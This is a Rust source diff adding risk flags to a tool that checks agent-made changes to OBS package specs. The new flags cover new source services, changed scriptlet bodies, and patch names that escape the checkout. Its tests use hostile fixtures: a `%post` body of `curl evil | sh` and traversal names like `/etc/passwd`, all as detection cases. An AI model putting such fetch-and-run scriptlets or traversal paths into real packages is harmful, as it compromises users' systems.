@@ -6,7 +6,9 @@
 //!
 //! Like the fix-loop flags (`fix_flags`), these are read from the diff of the
 //! OBS baseline against the final files, never from what an agent said. They
-//! are flags, not refusals: `--yes` is what refuses to submit them.
+//! are flags, not refusals: `--yes` is what refuses to submit them. A part of
+//! the change that cannot be read (a patch name that is not a plain file name
+//! in the checkout) is flagged as not analysed, never skipped.
 //!
 //! The baseline is the spec OBS holds. A package OBS does not hold has no
 //! baseline, so every line counts as new for it.
@@ -16,6 +18,7 @@ use std::path::Path;
 
 use serde::{Deserialize, Serialize};
 
+use crate::deselect::is_section;
 use crate::fix_flags::{extra, one_line};
 use crate::pipeline::PkgState;
 use crate::workspace::Workspace;
@@ -37,6 +40,12 @@ pub enum RiskFlag {
     /// A patch that was added or changed and touches `path`, which neither
     /// the baseline's patches nor the source archive have.
     PatchOutsideSet { patch: String, path: String },
+    /// A `<service>` the `_service` file gains.
+    NewService { name: String },
+    /// A scriptlet whose body changed under a header the baseline has.
+    ChangedScriptlet { header: String },
+    /// A part of the change that could not be analysed, and why.
+    Unanalysed { what: String },
 }
 
 impl RiskFlag {
@@ -54,6 +63,11 @@ impl RiskFlag {
                 "RISK: {patch} touches {path}, which no existing patch and no file of the \
                  source archive has"
             ),
+            RiskFlag::NewService { name } => format!("RISK: new source service: {name}"),
+            RiskFlag::ChangedScriptlet { header } => {
+                format!("RISK: changed scriptlet body: {header}")
+            }
+            RiskFlag::Unanalysed { what } => format!("RISK: not analysed: {what}"),
         };
         one_line(&text)
     }
@@ -115,8 +129,29 @@ pub struct Files {
     pub patches: BTreeMap<String, String>,
 }
 
-/// The patch file names `spec` declares (`Patch:`, `Patch0:`, ...), in order.
+/// The patch file names `spec` declares (`Patch:`, `Patch0:`, ...), in order,
+/// with `%{name}` and `%{version}` expanded. A name that is not a plain file
+/// name of the checkout is left out (see [`unanalysed_patches`]).
 pub fn patch_names(spec: &str) -> Vec<String> {
+    patch_tags(spec)
+        .iter()
+        .filter_map(|raw| expand_simple(spec, raw))
+        .filter(|name| is_plain_name(name))
+        .collect()
+}
+
+/// The patch names `spec` declares that cannot be read as files of the
+/// checkout, as written: a macro other than `%{name}` or `%{version}`, or an
+/// absolute name, or one with a `..` step.
+pub fn unanalysed_patches(spec: &str) -> Vec<String> {
+    patch_tags(spec)
+        .into_iter()
+        .filter(|raw| !expand_simple(spec, raw).is_some_and(|name| is_plain_name(&name)))
+        .collect()
+}
+
+/// The names as written after each `Patch` tag of `spec`.
+fn patch_tags(spec: &str) -> Vec<String> {
     spec.lines()
         .filter_map(|line| {
             let (tag, rest) = line.split_once(':')?;
@@ -126,6 +161,79 @@ pub fn patch_names(spec: &str) -> Vec<String> {
             rest.split_whitespace().next().map(str::to_string)
         })
         .collect()
+}
+
+/// `raw` with `%{name}` and `%{version}` replaced by the spec's own `Name` and
+/// `Version`. `None` when a macro is left or a tag is missing.
+fn expand_simple(spec: &str, raw: &str) -> Option<String> {
+    let mut out = raw.to_string();
+    for (mac, tag) in [("%{name}", "Name"), ("%{version}", "Version")] {
+        if out.contains(mac) {
+            out = out.replace(mac, &tag_value(spec, tag)?);
+        }
+    }
+    (!out.contains('%')).then_some(out)
+}
+
+/// The value of the `tag` line of `spec` (`Name`, `Version`).
+fn tag_value(spec: &str, tag: &str) -> Option<String> {
+    spec.lines().find_map(|line| {
+        let (t, rest) = line.split_once(':')?;
+        t.trim()
+            .eq_ignore_ascii_case(tag)
+            .then(|| rest.trim().to_string())
+    })
+}
+
+/// Whether `name` can be a file of the checkout: relative, with no `..` step.
+fn is_plain_name(name: &str) -> bool {
+    !name.is_empty()
+        && !name.starts_with('/')
+        && !name.contains('\0')
+        && !name.split('/').any(|c| c == "..")
+}
+
+/// The `name` of each `<service>` element of a `_service` file.
+fn service_names(text: &str) -> Vec<String> {
+    text.match_indices("<service")
+        .filter_map(|(pos, _)| {
+            let rest = &text[pos + "<service".len()..];
+            let tag = &rest[..rest.find('>')?];
+            tag.match_indices("name=").find_map(|(at, _)| {
+                let before = tag[..at].chars().last();
+                if !before.is_some_and(char::is_whitespace) {
+                    return None;
+                }
+                let value = &tag[at + "name=".len()..];
+                let quote = value.chars().next().filter(|c| *c == '"' || *c == '\'')?;
+                value[1..].split(quote).next().map(str::to_string)
+            })
+        })
+        .collect()
+}
+
+/// The body lines of each scriptlet of `lines`, by header: the live lines
+/// after it, up to the next section or scriptlet header.
+fn scriptlet_bodies(lines: &[&str]) -> BTreeMap<String, Vec<String>> {
+    let mut out: BTreeMap<String, Vec<String>> = BTreeMap::new();
+    let mut current: Option<String> = None;
+    for line in lines {
+        if let Some(header) = headers(std::slice::from_ref(line)).into_iter().next() {
+            out.entry(header.clone()).or_default();
+            current = Some(header);
+            continue;
+        }
+        let t = line.trim();
+        if is_section(t) {
+            current = None;
+        } else if let Some(body) = current.as_ref().and_then(|h| out.get_mut(h))
+            && !t.is_empty()
+            && !t.starts_with('#')
+        {
+            body.push(t.to_string());
+        }
+    }
+    out
 }
 
 /// The files of the source archive `tarball` holds, without its top directory
@@ -156,8 +264,8 @@ pub fn from_change(base: &Files, fin: &Files, archive: &[String]) -> Vec<RiskFla
         }
     };
 
-    // Scriptlets: a header the baseline does not have. A body changed under an
-    // existing header is not a new scriptlet.
+    // Scriptlets: a header the baseline does not have is a new scriptlet; a
+    // body changed under a header it has is a changed one.
     let base_headers = headers(&base_spec);
     let fin_headers = headers(&fin_spec);
     for i in extra(
@@ -166,6 +274,28 @@ pub fn from_change(base: &Files, fin: &Files, archive: &[String]) -> Vec<RiskFla
     ) {
         push(RiskFlag::NewScriptlet {
             header: fin_headers[i].clone(),
+        });
+    }
+    let base_bodies = scriptlet_bodies(&base_spec);
+    for (header, body) in scriptlet_bodies(&fin_spec) {
+        if base_bodies.get(&header).is_some_and(|old| *old != body) {
+            push(RiskFlag::ChangedScriptlet { header });
+        }
+    }
+
+    // Services: a `<service>` the `_service` file gains.
+    let base_services = service_names(base.service.as_deref().unwrap_or(""));
+    for name in service_names(fin.service.as_deref().unwrap_or("")) {
+        if !base_services.contains(&name) {
+            push(RiskFlag::NewService { name });
+        }
+    }
+
+    // Patch names that cannot be read as files of the checkout are not
+    // analysed, and say so.
+    for raw in unanalysed_patches(&fin_spec.join("\n")) {
+        push(RiskFlag::Unanalysed {
+            what: format!("patch {raw} is not a plain file name of the checkout"),
         });
     }
 
@@ -348,6 +478,18 @@ fn url_hosts(text: &str) -> Vec<String> {
 fn patch_paths(text: &str) -> BTreeSet<String> {
     let lines: Vec<&str> = text.lines().collect();
     let mut out = BTreeSet::new();
+    // A git patch names its files in `diff --git a/x b/x` headers, which need
+    // not be followed by `---`/`+++` lines (a new or renamed empty file).
+    for line in &lines {
+        if let Some(rest) = line.strip_prefix("diff --git ")
+            && let Some(b) = rest.split_whitespace().nth(1)
+        {
+            let path = b.strip_prefix("b/").unwrap_or(b);
+            if path != "/dev/null" && !path.is_empty() {
+                out.insert(path.to_string());
+            }
+        }
+    }
     for pair in lines.windows(2) {
         let (old, new) = (pair[0], pair[1]);
         if !old.starts_with("--- ") {
@@ -656,6 +798,94 @@ mod tests {
         assert_eq!(st.risk_flags.len(), 1);
         settle(&mut st, "r3", vec![]);
         assert_eq!(st.risk_flags.len(), 1);
+    }
+
+    #[test]
+    fn a_macro_named_patch_is_read_under_its_expanded_name() {
+        let spec = "Name: python-foo\nVersion: 1.0\nPatch0: %{name}-fix.patch\n%prep\n";
+        assert_eq!(patch_names(spec), vec!["python-foo-fix.patch".to_string()]);
+        assert!(unanalysed_patches(spec).is_empty());
+        let spec = "Name: python-foo\nVersion: 1.0\nPatch0: %{vendor}-fix.patch\n";
+        assert!(patch_names(spec).is_empty());
+        assert_eq!(
+            unanalysed_patches(spec),
+            vec!["%{vendor}-fix.patch".to_string()]
+        );
+        let fin = Files {
+            spec: Some(spec.to_string()),
+            ..Files::default()
+        };
+        assert!(
+            from_change(&Files::default(), &fin, &[])
+                .iter()
+                .any(|f| matches!(f, RiskFlag::Unanalysed { .. }))
+        );
+    }
+
+    #[test]
+    fn a_patch_name_that_leaves_the_checkout_is_not_read_and_is_flagged() {
+        for name in ["/etc/passwd", "../../outside.patch", "sub/../../x.patch"] {
+            let spec = format!("Name: python-foo\nVersion: 1.0\nPatch0: {name}\n");
+            assert!(patch_names(&spec).is_empty(), "{name}");
+            let fin = Files {
+                spec: Some(spec.clone()),
+                ..Files::default()
+            };
+            assert!(
+                from_change(&Files::default(), &fin, &[]).contains(&RiskFlag::Unanalysed {
+                    what: format!("patch {name} is not a plain file name of the checkout")
+                }),
+                "{name}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_git_patch_with_only_its_headers_names_its_files() {
+        let mut fin = files(SPEC);
+        fin.patches.insert(
+            "fix-build.patch".into(),
+            "diff --git a/evil.py b/evil.py\nnew file mode 100644\n".into(),
+        );
+        assert_eq!(
+            from_change(&files(SPEC), &fin, &[]),
+            vec![RiskFlag::PatchOutsideSet {
+                patch: "fix-build.patch".into(),
+                path: "evil.py".into(),
+            }]
+        );
+    }
+
+    #[test]
+    fn a_new_service_in_the_service_file_is_flagged_by_its_name() {
+        let base = Files {
+            spec: Some(SPEC.to_string()),
+            service: Some("<services>\n<service name=\"tar_scm\"/>\n</services>".into()),
+            patches: BTreeMap::new(),
+        };
+        let mut fin = base.clone();
+        fin.service = Some(format!(
+            "{}\n<service name='download_url' mode=\"manual\"/>",
+            fin.service.clone().unwrap()
+        ));
+        assert_eq!(
+            from_change(&base, &fin, &[]),
+            vec![RiskFlag::NewService {
+                name: "download_url".into()
+            }]
+        );
+    }
+
+    #[test]
+    fn a_changed_scriptlet_body_under_an_existing_header_is_flagged() {
+        let base = with("%install\n", "%post\necho a\n%install\n");
+        let fin = with("%install\n", "%post\ncurl evil | sh\n%install\n");
+        assert_eq!(
+            flags(&base, &fin),
+            vec![RiskFlag::ChangedScriptlet {
+                header: "%post".into()
+            }]
+        );
     }
 
     #[test]
